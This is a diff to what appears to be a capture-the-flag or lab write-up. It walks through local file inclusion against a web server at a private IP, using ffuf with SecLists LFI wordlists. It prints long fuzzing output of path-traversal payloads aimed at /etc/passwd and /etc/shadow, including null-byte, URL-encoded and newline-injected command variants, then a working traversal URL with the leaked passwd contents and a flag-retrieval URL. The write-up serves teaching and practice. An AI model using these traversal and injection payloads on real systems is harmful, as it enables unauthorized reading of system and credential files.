@@ -192,5 +192,103 @@ Apache/2.2.22 (Ubuntu) Server at 10.48.161.15 Port 80
 Now we do fuzzing with those having the websever as apache. The wordlist is */home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt* with the command
 
 ```
-ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt
+ffuf -u http://10.48.161.15/?page=FUZZ -w /home/Seclists/Discovery/Web-Content/Web-Servers/Apache.txt -fw 1367,1369
 ```
+ This also not gave us a valid endpoint. 
+
+So i searched inside the seclist and found there is spcifically many files fo r the lfi under the folder /Seclists/fuzzing/lfi/
+```
+LFI-etc-files-of-all-linux-packages.txt     
+LFI-gracefulsecurity-linux.txt              
+LFI-gracefulsecurity-windows.txt            
+LFI-Jhaddix.txt                             
+LFI-LFISuite-pathtotest-huge.txt            
+LFI-LFISuite-pathtotest.txt                 
+LFI-linux-and-windows_by-1N3@CrowdShield.txt
+LFI-Windows-adeadfed.txt                    
+OMI-Agent-Linux.txt
+```
+
+We are going to specfically use the LFI-Jhaddix.txt.
+
+With The command
+
+```
+ffuf -u http://10.48.161.15/?page=FUZZ -w 
+/home/Seclists/fuzzing/lfi/LFI-Jhaddix.txt -fw 1367,1369
+```
+
+And we will get several endpoint with this command only.
+
+```
+%0a/bin/cat%20/etc/passwd [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 79ms]
+%0a/bin/cat%20/etc/shadow [Status: 200, Size: 3987, Words: 1368, Lines: 125, Duration: 89ms]
+../../../../../../../dev [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 78ms]
+../../../../../../../../../../../../etc/hosts [Status: 200, Size: 4051, Words: 1360, Lines: 131, Duration: 81ms]
+../../../../../../../../../../../../etc/hosts%00 [Status: 200, Size: 4051, Words: 1360, Lines: 131, Duration: 79ms]
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 67ms]
+../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
+../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
+../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
+../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
+../../../../../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
+../../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
+../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 75ms]
+../../../../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 75ms]
+../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 64ms]
+../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
+../../../../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 77ms]
+../../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 71ms]
+../../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 71ms]
+../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
+../../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
+../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
+../../../../../../../etc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
+../../../../etc/passwd  [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
+../../../etc/passwd     [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
+../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 66ms]
+../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 68ms]
+../../../../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 85ms]
+../../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
+../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
+../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 88ms]
+../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 86ms]
+../../../../../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 88ms]
+../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
+../../../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
+../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 74ms]
+../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 78ms]
+../../../../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 79ms]
+../../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
+../../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 80ms]
+../../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
+../../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 73ms]
+../../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 82ms]
+../../../etc/passwd%00  [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
+../../../../etc/passwd%00 [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 81ms]
+../../../../../../etc/passwd&=%3C%3C%3C%3C [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 86ms]
+../../../../../../../../../../../../etc/shadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 70ms]
+../../../../../../../../../../../../../../../../../../../../../../etc/shadow%00 [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 72ms]
+../../../../../../../../../../../../etc/shadow%00 [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 75ms]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fshadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 2813ms]
+..%2F..%2F..%2F%2F..%2F..%2Fetc/shadow [Status: 200, Size: 3877, Words: 1358, Lines: 124, Duration: 3488ms]
+..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3492ms]
+..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd [Status: 200, Size: 4638, Words: 1363, Lines: 143, Duration: 3501ms]
+:: Progress: [930/930] :: Job [1/1] :: 117 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+
+```
+
+Let's Hit the first endpoint 
+
+*http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd*
+
+and we got 
+
+```
+root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/bin/sh bin:x:2:2:bin:/bin:/bin/sh sys:x:3:3:sys:/dev:/bin/sh sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/bin/sh man:x:6:12:man:/var/cache/man:/bin/sh lp:x:7:7:lp:/var/spool/lpd:/bin/sh mail:x:8:8:mail:/var/mail:/bin/sh news:x:9:9:news:/var/spool/news:/bin/sh uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh proxy:x:13:13:proxy:/bin:/bin/sh www-data:x:33:33:www-data:/var/www:/bin/sh backup:x:34:34:backup:/var/backups:/bin/sh list:x:38:38:Mailing List Manager:/var/list:/bin/sh irc:x:39:39:ircd:/var/run/ircd:/bin/sh gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh nobody:x:65534:65534:nobody:/nonexistent:/bin/sh libuuid:x:100:101::/var/lib/libuuid:/bin/sh
+```
+Now the endpoint *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fetc/passwd* is giving me the content of /etc/passwd
+
+And if we modify the url to this *http://10.48.161.15/?page=..%2F..%2F..%2F%2F..%2F..%2Fflag.txt* We will get the flag
+
+<flag_img>
